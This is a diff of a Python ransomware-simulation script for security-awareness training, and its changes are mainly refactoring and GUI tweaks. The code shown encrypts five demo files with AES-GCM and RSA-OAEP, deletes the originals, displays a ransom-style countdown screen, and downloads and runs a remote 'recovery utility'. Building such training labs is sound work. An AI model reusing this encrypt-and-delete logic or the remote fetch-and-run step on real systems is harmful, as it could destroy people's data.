@@ -25,16 +25,15 @@ except ImportError:
 
 
 # ============================================================
-# CONTROLLED SECURITY-AWARENESS LAB
+# CONTROLLED SECURITY AWARENESS LAB
 #
-# ONLY these exact demo files are processed:
+# Only these exact files are processed:
 #
 # ~/Desktop/RansomDemo/targets/
 #
-# No recursive scanning.
+# No recursive filesystem scanning.
 # No persistence.
 # No network-share access.
-# No system-directory access.
 # ============================================================
 
 
@@ -55,7 +54,7 @@ MASCOT_IMAGE_FILE = RUNTIME_DIR / "unt_mascot.png"
 
 
 # ============================================================
-# GITHUB RAW URLS
+# GITHUB RAW
 # ============================================================
 
 
@@ -101,22 +100,20 @@ COUNTDOWN_MINUTES = 30
 
 
 # ============================================================
-# COLORS
+# UI COLORS
 # ============================================================
 
 
 BG = "#8b0000"
-PANEL = "#141414"
-PANEL_2 = "#222222"
+PANEL = "#171717"
 
 WHITE = "#ffffff"
 YELLOW = "#ffe600"
-RED = "#ff3030"
 GRAY = "#bbbbbb"
 
 
 # ============================================================
-# LOG
+# LOGGING
 # ============================================================
 
 
@@ -131,7 +128,10 @@ def write_log(message):
         "%Y-%m-%d %H:%M:%S"
     )
 
-    line = f"{timestamp} {message}"
+    line = (
+        f"{timestamp} "
+        f"{message}"
+    )
 
     print(line)
 
@@ -158,15 +158,15 @@ def sha256_file(path):
 
         while True:
 
-            block = file.read(
+            chunk = file.read(
                 1024 * 1024
             )
 
-            if not block:
+            if not chunk:
                 break
 
             digest.update(
-                block
+                chunk
             )
 
     return digest.hexdigest()
@@ -196,7 +196,7 @@ def setup():
 
 
 # ============================================================
-# RSA KEY PAIR
+# RSA KEY GENERATION
 # ============================================================
 
 
@@ -237,8 +237,11 @@ def generate_keys():
         key.export_key()
     )
 
+
     PUBLIC_KEY_FILE.write_bytes(
-        key.publickey().export_key()
+        key
+        .publickey()
+        .export_key()
     )
 
 
@@ -260,7 +263,7 @@ def generate_keys():
 
 
 # ============================================================
-# SAVE ORIGINAL HASHES
+# ORIGINAL SHA-256 BASELINE
 # ============================================================
 
 
@@ -271,13 +274,17 @@ def save_original_checksums():
 
     for filename in TARGET_FILES:
 
-        path = TARGET_DIR / filename
+        path = (
+            TARGET_DIR
+            / filename
+        )
 
 
         if not path.exists():
 
             write_log(
-                f"[HASH-ERROR] Missing: {filename}"
+                "[HASH-ERROR] "
+                f"Missing source file: {filename}"
             )
 
             continue
@@ -286,7 +293,8 @@ def save_original_checksums():
         if path.is_symlink():
 
             write_log(
-                f"[HASH-ERROR] Symlink rejected: {filename}"
+                "[HASH-ERROR] "
+                f"Symlink rejected: {filename}"
             )
 
             continue
@@ -296,13 +304,16 @@ def save_original_checksums():
             path
         )
 
+
         checksums[
             filename
         ] = digest
 
 
         write_log(
-            f"[HASH-BEFORE] {filename} {digest}"
+            "[HASH-BEFORE] "
+            f"{filename} "
+            f"{digest}"
         )
 
 
@@ -316,27 +327,35 @@ def save_original_checksums():
 
 
     write_log(
-        "[HASH] Baseline checksums saved"
+        "[HASH] SHA-256 baseline saved"
     )
 
 
 # ============================================================
-# ENCRYPT ONE DEMO FILE
+# ENCRYPT ONE FILE
 # ============================================================
 
 
 def encrypt_file(filename):
 
-    source = TARGET_DIR / filename
-
-    encrypted = TARGET_DIR / (
-        filename + ".unt"
+    source = (
+        TARGET_DIR
+        / filename
     )
 
-    backup = BACKUP_DIR / filename
+    encrypted = (
+        TARGET_DIR
+        / (filename + ".unt")
+    )
 
-    temporary = TARGET_DIR / (
-        filename + ".unt.tmp"
+    backup = (
+        BACKUP_DIR
+        / filename
+    )
+
+    temporary = (
+        TARGET_DIR
+        / (filename + ".unt.tmp")
     )
 
 
@@ -348,7 +367,8 @@ def encrypt_file(filename):
     if source.is_symlink():
 
         write_log(
-            f"[SKIP] Symlink rejected: {filename}"
+            "[SKIP] "
+            f"Symlink rejected: {filename}"
         )
 
         return False
@@ -359,14 +379,16 @@ def encrypt_file(filename):
         if encrypted.exists():
 
             write_log(
-                f"[INFO] Already encrypted: {filename}"
+                "[INFO] "
+                f"Already encrypted: {filename}"
             )
 
             return True
 
 
         write_log(
-            f"[ERROR] Source missing: {filename}"
+            "[ERROR] "
+            f"Source file missing: {filename}"
         )
 
         return False
@@ -375,7 +397,9 @@ def encrypt_file(filename):
     if encrypted.exists():
 
         write_log(
-            f"[ERROR] Original and .unt both exist: {filename}"
+            "[ERROR] "
+            f"Original and encrypted file both exist: "
+            f"{filename}"
         )
 
         return False
@@ -394,7 +418,8 @@ def encrypt_file(filename):
         )
 
         write_log(
-            f"[BACKUP] {filename}"
+            "[BACKUP] "
+            f"{filename}"
         )
 
 
@@ -402,7 +427,7 @@ def encrypt_file(filename):
 
 
     # --------------------------------------------------------
-    # AES-256-GCM
+    # RANDOM AES-256 KEY
     # --------------------------------------------------------
 
 
@@ -410,10 +435,17 @@ def encrypt_file(filename):
         32
     )
 
+
+    # --------------------------------------------------------
+    # AES-256-GCM
+    # --------------------------------------------------------
+
+
     aes_cipher = AES.new(
         aes_key,
         AES.MODE_GCM
     )
+
 
     ciphertext, tag = (
         aes_cipher.encrypt_and_digest(
@@ -423,7 +455,7 @@ def encrypt_file(filename):
 
 
     # --------------------------------------------------------
-    # RSA-OAEP WRAPS AES KEY
+    # RSA-OAEP
     # --------------------------------------------------------
 
 
@@ -438,8 +470,10 @@ def encrypt_file(filename):
     )
 
 
-    wrapped_key = rsa_cipher.encrypt(
-        aes_key
+    encrypted_aes_key = (
+        rsa_cipher.encrypt(
+            aes_key
+        )
     )
 
 
@@ -450,26 +484,26 @@ def encrypt_file(filename):
         ) as file:
 
 
-            # File signature
             file.write(
                 MAGIC
             )
 
 
-            # RSA wrapped AES key
             file.write(
-                len(wrapped_key).to_bytes(
+                len(
+                    encrypted_aes_key
+                ).to_bytes(
                     2,
                     "big"
                 )
             )
 
+
             file.write(
-                wrapped_key
+                encrypted_aes_key
             )
 
 
-            # AES-GCM nonce
             file.write(
                 len(
                     aes_cipher.nonce
@@ -479,12 +513,12 @@ def encrypt_file(filename):
                 )
             )
 
+
             file.write(
                 aes_cipher.nonce
             )
 
 
-            # Authentication tag
             file.write(
                 len(tag).to_bytes(
                     1,
@@ -492,12 +526,12 @@ def encrypt_file(filename):
                 )
             )
 
+
             file.write(
                 tag
             )
 
 
-            # Ciphertext
             file.write(
                 ciphertext
             )
@@ -509,14 +543,13 @@ def encrypt_file(filename):
         )
 
 
-        # Remove visible plaintext only after encrypted
-        # output was successfully finalized.
         source.unlink()
 
 
         write_log(
-            f"[ENCRYPTED] "
-            f"{filename} -> {filename}.unt"
+            "[ENCRYPTED] "
+            f"{filename} -> "
+            f"{filename}.unt"
         )
 
 
@@ -532,7 +565,7 @@ def encrypt_file(filename):
 
 
         write_log(
-            f"[ENCRYPT-FAILED] "
+            "[ENCRYPT-FAILED] "
             f"{filename}: {error}"
         )
 
@@ -541,13 +574,13 @@ def encrypt_file(filename):
 
 
 # ============================================================
-# ENCRYPT ALL EXACT TARGETS
+# ENCRYPT ALL
 # ============================================================
 
 
 def encrypt_all():
 
-    success = 0
+    successful = 0
 
 
     for filename in TARGET_FILES:
@@ -556,14 +589,14 @@ def encrypt_all():
             filename
         ):
 
-            success += 1
+            successful += 1
 
 
-    return success
+    return successful
 
 
 # ============================================================
-# VERIFY ENCRYPTED STATE
+# VERIFY ENCRYPTION
 # ============================================================
 
 
@@ -585,7 +618,8 @@ def verify_encrypted_state():
         if plaintext.exists():
 
             write_log(
-                f"[VERIFY-ERROR] Plaintext remains: {filename}"
+                "[VERIFY-ERROR] "
+                f"Plaintext remains: {filename}"
             )
 
             return False
@@ -594,27 +628,33 @@ def verify_encrypted_state():
         if not encrypted.exists():
 
             write_log(
-                f"[VERIFY-ERROR] Missing: {filename}.unt"
+                "[VERIFY-ERROR] "
+                f"Encrypted file missing: "
+                f"{filename}.unt"
             )
 
             return False
 
 
     write_log(
-        "[VERIFY] All 5 demo files encrypted"
+        "[VERIFY] "
+        "All 5 training files encrypted"
     )
+
 
     return True
 
 
 # ============================================================
-# HTTP HELPER
+# HTTP DOWNLOAD HELPER
 # ============================================================
 
 
-def download_url(url, timeout=15):
+def download_url(
+    url,
+    timeout=15
+):
 
-    # cache busting
     final_url = (
         url
         + "?t="
@@ -664,7 +704,9 @@ def get_remote_recovery_code():
 
     code = (
         raw
-        .decode("utf-8")
+        .decode(
+            "utf-8"
+        )
         .strip()
     )
 
@@ -684,7 +726,8 @@ def get_remote_recovery_code():
 
 
     write_log(
-        "[RECOVERY] Remote recovery code retrieved"
+        "[RECOVERY] "
+        "Remote recovery code retrieved"
     )
 
 
@@ -699,7 +742,8 @@ def get_remote_recovery_code():
 def download_decryptor():
 
     write_log(
-        "[RECOVERY] Downloading recovery utility"
+        "[RECOVERY] "
+        "Downloading recovery utility"
     )
 
 
@@ -734,7 +778,8 @@ def download_decryptor():
 
 
     write_log(
-        "[RECOVERY] Recovery utility downloaded"
+        "[RECOVERY] "
+        "Recovery utility downloaded"
     )
 
 
@@ -748,7 +793,8 @@ def download_mascot_image():
     try:
 
         write_log(
-            "[GUI] Downloading mascot image"
+            "[GUI] "
+            "Downloading mascot image"
         )
 
 
@@ -761,7 +807,7 @@ def download_mascot_image():
         if len(data) < 500:
 
             raise RuntimeError(
-                "Downloaded mascot image is too small"
+                "Mascot image download failed"
             )
 
 
@@ -783,7 +829,8 @@ def download_mascot_image():
 
 
         write_log(
-            "[GUI] Mascot image downloaded"
+            "[GUI] "
+            "Mascot image downloaded"
         )
 
 
@@ -793,7 +840,7 @@ def download_mascot_image():
     except Exception as error:
 
         write_log(
-            f"[GUI-WARNING] "
+            "[GUI-WARNING] "
             f"Mascot download failed: {error}"
         )
 
@@ -802,7 +849,7 @@ def download_mascot_image():
 
 
 # ============================================================
-# LOAD / REMOVE BLACK BACKGROUND
+# LOAD MASCOT
 # ============================================================
 
 
@@ -811,7 +858,8 @@ def load_mascot_photo():
     if not PIL_AVAILABLE:
 
         write_log(
-            "[GUI-WARNING] Pillow unavailable"
+            "[GUI-WARNING] "
+            "Pillow not available"
         )
 
         return None
@@ -831,13 +879,12 @@ def load_mascot_photo():
         )
 
 
-        processed = []
+        pixels = []
 
 
         for red, green, blue, alpha in image.getdata():
 
 
-            # Turn near-black background transparent.
             if (
                 red < 40
                 and
@@ -846,14 +893,14 @@ def load_mascot_photo():
                 blue < 40
             ):
 
-                processed.append(
+                pixels.append(
                     (0, 0, 0, 0)
                 )
 
 
             else:
 
-                processed.append(
+                pixels.append(
                     (
                         red,
                         green,
@@ -864,7 +911,7 @@ def load_mascot_photo():
 
 
         image.putdata(
-            processed
+            pixels
         )
 
 
@@ -878,7 +925,6 @@ def load_mascot_photo():
             )
 
 
-        # Large left-side mascot
         image.thumbnail(
             (500, 680)
         )
@@ -892,7 +938,7 @@ def load_mascot_photo():
     except Exception as error:
 
         write_log(
-            f"[GUI-WARNING] "
+            "[GUI-WARNING] "
             f"Mascot processing failed: {error}"
         )
 
@@ -948,57 +994,7 @@ def show_warning_window():
 
 
     # ========================================================
-    # BACKGROUND
-    # ========================================================
-
-
-    canvas = tk.Canvas(
-        root,
-        bg=BG,
-        highlightthickness=0
-    )
-
-
-    canvas.place(
-        x=0,
-        y=0,
-        relwidth=1,
-        relheight=1
-    )
-
-
-    # Faint warning pattern.
-    # ASCII-based so it does not depend on emoji font support.
-
-    for y in range(
-        100,
-        1100,
-        190
-    ):
-
-        for x in range(
-            130,
-            2000,
-            350
-        ):
-
-            canvas.create_text(
-                x,
-                y,
-                text="!",
-                fill="#790000",
-                font=(
-                    "Arial",
-                    78,
-                    "bold"
-                )
-            )
-
-
-    # ========================================================
     # MAIN CONTAINER
-    #
-    # rely > 0.5 moves whole interface slightly downward.
     # ========================================================
 
 
@@ -1008,15 +1004,16 @@ def show_warning_window():
     )
 
 
+    # Slightly below screen center.
     main_frame.place(
         relx=0.5,
-        rely=0.55,
+        rely=0.53,
         anchor="center"
     )
 
 
     # ========================================================
-    # LEFT - MASCOT
+    # LEFT SIDE - MASCOT
     # ========================================================
 
 
@@ -1029,7 +1026,7 @@ def show_warning_window():
     left_frame.grid(
         row=0,
         column=0,
-        padx=(20, 55),
+        padx=(20, 65),
         sticky="n"
     )
 
@@ -1042,7 +1039,7 @@ def show_warning_window():
     if mascot_photo is not None:
 
 
-        mascot_label = tk.Label(
+        mascot = tk.Label(
             left_frame,
             image=mascot_photo,
             bg=BG,
@@ -1050,13 +1047,13 @@ def show_warning_window():
         )
 
 
-        mascot_label.image = (
+        mascot.image = (
             mascot_photo
         )
 
 
-        mascot_label.pack(
-            pady=(40, 0)
+        mascot.pack(
+            pady=(35, 0)
         )
 
 
@@ -1109,7 +1106,7 @@ def show_warning_window():
         text="RANSOMWARE INFECTION",
         font=(
             "Arial",
-            38,
+            40,
             "bold"
         ),
         fg=WHITE,
@@ -1118,11 +1115,11 @@ def show_warning_window():
 
 
     title.pack(
-        pady=(5, 5)
+        pady=(10, 8)
     )
 
 
-    encrypted_title = tk.Label(
+    encrypted_message = tk.Label(
         right_frame,
         text="YOUR FILES HAVE BEEN ENCRYPTED",
         font=(
@@ -1135,8 +1132,8 @@ def show_warning_window():
     )
 
 
-    encrypted_title.pack(
-        pady=3
+    encrypted_message.pack(
+        pady=4
     )
 
 
@@ -1153,83 +1150,7 @@ def show_warning_window():
 
 
     test_notice.pack(
-        pady=(3, 10)
-    )
-
-
-    # ========================================================
-    # PAYMENT-STYLE TRAINING PANEL
-    # ========================================================
-
-
-    payment_panel = tk.Frame(
-        right_frame,
-        bg=PANEL,
-        highlightbackground="#4a4a4a",
-        highlightthickness=1
-    )
-
-
-    payment_panel.pack(
-        fill="x",
-        padx=35,
-        pady=(5, 12)
-    )
-
-
-    payment_title = tk.Label(
-        payment_panel,
-        text="DEMO PAYMENT INFORMATION",
-        font=(
-            "Arial",
-            12,
-            "bold"
-        ),
-        fg=RED,
-        bg=PANEL
-    )
-
-
-    payment_title.pack(
-        pady=(9, 2)
-    )
-
-
-    payment_notice = tk.Label(
-        payment_panel,
-        text="TRAINING ONLY — NO PAYMENT IS REQUIRED",
-        font=(
-            "Arial",
-            11,
-            "bold"
-        ),
-        fg=YELLOW,
-        bg=PANEL
-    )
-
-
-    payment_notice.pack(
-        pady=2
-    )
-
-
-    fake_wallet = tk.Label(
-        payment_panel,
-        text=(
-            "DEMO BTC ADDRESS: "
-            "TEST-ONLY-NOT-A-REAL-ADDRESS"
-        ),
-        font=(
-            "Courier",
-            10
-        ),
-        fg=GRAY,
-        bg=PANEL
-    )
-
-
-    fake_wallet.pack(
-        pady=(2, 9)
+        pady=(3, 25)
     )
 
 
@@ -1238,44 +1159,19 @@ def show_warning_window():
     # ========================================================
 
 
-    timer_border = tk.Frame(
-        right_frame,
-        bg=RED,
-        padx=2,
-        pady=2
-    )
-
-
-    timer_border.pack(
-        pady=(2, 12)
-    )
-
-
     timer_panel = tk.Frame(
-        timer_border,
+        right_frame,
         bg=PANEL,
-        padx=40,
-        pady=10
+        padx=45,
+        pady=15,
+        highlightbackground="#555555",
+        highlightthickness=1
     )
 
 
-    timer_panel.pack()
-
-
-    timer_heading = tk.Label(
-        timer_panel,
-        text="TIME REMAINING",
-        font=(
-            "Arial",
-            12,
-            "bold"
-        ),
-        fg=WHITE,
-        bg=PANEL
+    timer_panel.pack(
+        pady=(5, 20)
     )
-
-
-    timer_heading.pack()
 
 
     timer_label = tk.Label(
@@ -1283,7 +1179,7 @@ def show_warning_window():
         text="00:30:00",
         font=(
             "Courier",
-            48,
+            50,
             "bold"
         ),
         fg=YELLOW,
@@ -1295,14 +1191,15 @@ def show_warning_window():
 
 
     # ========================================================
-    # VIEW ENCRYPTED FILES
+    # VIEW FILES
     # ========================================================
 
 
     def view_files():
 
         write_log(
-            "[GUI] Encrypted directory opened"
+            "[GUI] "
+            "Encrypted directory opened"
         )
 
 
@@ -1336,72 +1233,55 @@ def show_warning_window():
         text="VIEW ENCRYPTED FILES",
         font=(
             "Arial",
-            13,
+            14,
             "bold"
         ),
         command=view_files,
-        fg=WHITE,
-        bg=PANEL_2,
-        activeforeground=WHITE,
-        activebackground="#333333",
+        fg="#111111",
+        bg="#eeeeee",
+        activeforeground="#111111",
+        activebackground="#dddddd",
         relief="solid",
         borderwidth=1,
-        padx=30,
-        pady=8,
+        padx=25,
+        pady=7,
         cursor="hand2"
     )
 
 
     view_button.pack(
-        pady=(0, 10)
+        pady=(0, 15)
     )
 
 
     # ========================================================
-    # RECOVERY PANEL
+    # RECOVERY CODE
     # ========================================================
-
-
-    recovery_panel = tk.Frame(
-        right_frame,
-        bg=PANEL,
-        padx=30,
-        pady=14,
-        highlightbackground="#4a4a4a",
-        highlightthickness=1
-    )
-
-
-    recovery_panel.pack(
-        fill="x",
-        padx=30,
-        pady=4
-    )
 
 
     code_label = tk.Label(
-        recovery_panel,
+        right_frame,
         text="RECOVERY CODE",
         font=(
             "Arial",
-            13,
+            14,
             "bold"
         ),
         fg=WHITE,
-        bg=PANEL
+        bg=BG
     )
 
 
     code_label.pack(
-        pady=(0, 5)
+        pady=(5, 5)
     )
 
 
     code_entry = tk.Entry(
-        recovery_panel,
+        right_frame,
         font=(
             "Courier",
-            20,
+            21,
             "bold"
         ),
         width=18,
@@ -1416,7 +1296,7 @@ def show_warning_window():
 
 
     code_entry.pack(
-        ipady=6,
+        ipady=7,
         pady=3
     )
 
@@ -1425,20 +1305,20 @@ def show_warning_window():
 
 
     status_label = tk.Label(
-        recovery_panel,
+        right_frame,
         text="",
         font=(
             "Arial",
-            11,
+            12,
             "bold"
         ),
         fg=YELLOW,
-        bg=PANEL
+        bg=BG
     )
 
 
     status_label.pack(
-        pady=5
+        pady=7
     )
 
 
@@ -1474,13 +1354,9 @@ def show_warning_window():
 
 
         write_log(
-            "[RECOVERY] Code validation requested"
+            "[RECOVERY] "
+            "Code validation requested"
         )
-
-
-        # ----------------------------------------------------
-        # GET CURRENT CODE FROM GITHUB
-        # ----------------------------------------------------
 
 
         try:
@@ -1494,8 +1370,8 @@ def show_warning_window():
 
 
             write_log(
-                f"[RECOVERY-ERROR] "
-                f"Remote validation failed: {error}"
+                "[RECOVERY-ERROR] "
+                f"Validation failed: {error}"
             )
 
 
@@ -1510,16 +1386,12 @@ def show_warning_window():
             return
 
 
-        # ----------------------------------------------------
-        # COMPARE
-        # ----------------------------------------------------
-
-
         if entered_code != remote_code:
 
 
             write_log(
-                "[RECOVERY] Invalid recovery code"
+                "[RECOVERY] "
+                "Invalid recovery code"
             )
 
 
@@ -1537,13 +1409,9 @@ def show_warning_window():
             return
 
 
-        # ----------------------------------------------------
-        # CORRECT CODE
-        # ----------------------------------------------------
-
-
         write_log(
-            "[RECOVERY] Remote code validated"
+            "[RECOVERY] "
+            "Remote recovery code validated"
         )
 
 
@@ -1555,13 +1423,7 @@ def show_warning_window():
         root.update_idletasks()
 
 
-        # ----------------------------------------------------
-        # DOWNLOAD / EXECUTE RECOVERY UTILITY
-        # ----------------------------------------------------
-
-
         try:
-
 
             status_label.config(
                 text=(
@@ -1578,9 +1440,7 @@ def show_warning_window():
 
 
             status_label.config(
-                text=(
-                    "STARTING FILE RECOVERY..."
-                )
+                text="STARTING FILE RECOVERY..."
             )
 
 
@@ -1598,7 +1458,8 @@ def show_warning_window():
 
 
             write_log(
-                "[RECOVERY] Recovery utility launched"
+                "[RECOVERY] "
+                "Recovery utility launched"
             )
 
 
@@ -1609,7 +1470,8 @@ def show_warning_window():
 
 
             write_log(
-                f"[RECOVERY-ERROR] {error}"
+                "[RECOVERY-ERROR] "
+                f"{error}"
             )
 
 
@@ -1627,21 +1489,21 @@ def show_warning_window():
 
 
     recover_button = tk.Button(
-        recovery_panel,
+        right_frame,
         text="RECOVER FILES",
         font=(
             "Arial",
-            14,
+            15,
             "bold"
         ),
         command=recover,
-        fg=WHITE,
-        bg="#5d0000",
-        activeforeground=WHITE,
-        activebackground="#750000",
+        fg="#111111",
+        bg="#eeeeee",
+        activeforeground="#111111",
+        activebackground="#dddddd",
         relief="solid",
         borderwidth=1,
-        padx=32,
+        padx=30,
         pady=8,
         cursor="hand2"
     )
@@ -1682,7 +1544,7 @@ def show_warning_window():
 
     footer.pack(
         side="bottom",
-        pady=16
+        pady=18
     )
 
 
@@ -1711,9 +1573,11 @@ def show_warning_window():
             seconds // 3600
         )
 
+
         minutes = (
             seconds % 3600
         ) // 60
+
 
         secs = (
             seconds % 60
@@ -1743,8 +1607,10 @@ def show_warning_window():
                 text="TRAINING TIMER EXPIRED"
             )
 
+
             write_log(
-                "[GUI] Countdown expired"
+                "[GUI] "
+                "Countdown expired"
             )
 
 
@@ -1752,7 +1618,8 @@ def show_warning_window():
 
 
     write_log(
-        "[GUI] Warning screen displayed"
+        "[GUI] "
+        "Warning screen displayed"
     )
 
 
@@ -1773,13 +1640,15 @@ def main():
         "=================================================="
     )
 
+
     write_log(
-        "[START] Security-awareness simulation started"
+        "[START] "
+        "Security-awareness simulation started"
     )
 
 
     # --------------------------------------------------------
-    # VERIFY EXPECTED DEMO FILES
+    # CHECK EXPECTED TRAINING FILES
     # --------------------------------------------------------
 
 
@@ -1814,7 +1683,8 @@ def main():
 
 
         write_log(
-            "[ABORT] Missing training files: "
+            "[ABORT] "
+            "Missing training files: "
             + ", ".join(
                 missing
             )
@@ -1822,7 +1692,7 @@ def main():
 
 
         print(
-            "\nMissing demo files:"
+            "\nRequired demo files are missing:"
         )
 
 
@@ -1837,7 +1707,7 @@ def main():
 
 
     # --------------------------------------------------------
-    # CRYPTO SETUP
+    # RSA
     # --------------------------------------------------------
 
 
@@ -1845,7 +1715,7 @@ def main():
 
 
     # --------------------------------------------------------
-    # ORIGINAL CHECKSUM DATABASE
+    # SHA-256 BASELINE
     # --------------------------------------------------------
 
 
@@ -1880,8 +1750,10 @@ def main():
 
 
     write_log(
-        f"[STATUS] Encryption: "
-        f"{successful}/{len(TARGET_FILES)}"
+        "[STATUS] "
+        f"Encryption: "
+        f"{successful}/"
+        f"{len(TARGET_FILES)}"
     )
 
 
@@ -1895,13 +1767,15 @@ def main():
 
         write_log(
             "[ABORT] "
-            "Encryption-state verification failed"
+            "Encrypted-state verification failed"
         )
 
 
         print(
-            "\nNot all demo files were encrypted."
+            "\nNot all demo files "
+            "were encrypted."
         )
+
 
         print(
             "GUI will not be displayed."
@@ -1912,7 +1786,7 @@ def main():
 
 
     # --------------------------------------------------------
-    # DOWNLOAD VISUAL ASSET
+    # VISUAL ASSET
     # --------------------------------------------------------
 
 
